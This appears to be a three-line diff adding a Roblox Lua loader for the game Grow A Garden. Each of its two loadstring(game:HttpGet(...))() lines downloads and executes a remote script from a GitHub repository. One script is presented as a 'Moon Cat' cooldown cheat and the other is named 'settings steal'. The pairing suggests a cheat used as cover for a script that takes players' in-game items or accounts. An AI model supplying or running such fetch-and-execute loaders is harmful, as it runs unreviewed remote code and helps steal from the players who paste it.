@@ -1,0 +1,3 @@
+loadstring(game:HttpGet("https://github.com/Rawbr10/GrowAGarden-Working/raw/refs/heads/main/settings%20Change%20Moon%20Cat%20Cooldown%20+%20MoonCat%20Range%20Changer"))()
+task.wait(1)
+loadstring(game:HttpGet("https://github.com/Rawbr10/GrowAGarden-Working/raw/refs/heads/main/settings%20steal"))()
